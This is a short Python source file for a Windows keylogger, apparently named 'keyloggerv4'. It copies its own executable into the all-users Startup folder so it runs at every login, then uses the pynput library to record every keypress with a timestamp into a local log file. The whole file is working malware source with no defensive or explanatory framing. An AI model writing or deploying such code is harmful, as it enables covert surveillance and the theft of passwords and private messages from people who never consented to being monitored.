from asyncore import read
from fileinput import filename
import os
import shutil
from pynput.keyboard import Listener, Key
import logging

listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")

if "keyloggerv4.exe" not in listapp:
    src_path = r"./keyloggerv4.exe"
    dst_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    shutil.copy(src_path, dst_path)

logging.basicConfig(filename='./kiss.txt',
level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))
        
with Listener(on_press=on_press) as listener:
    listener.join()

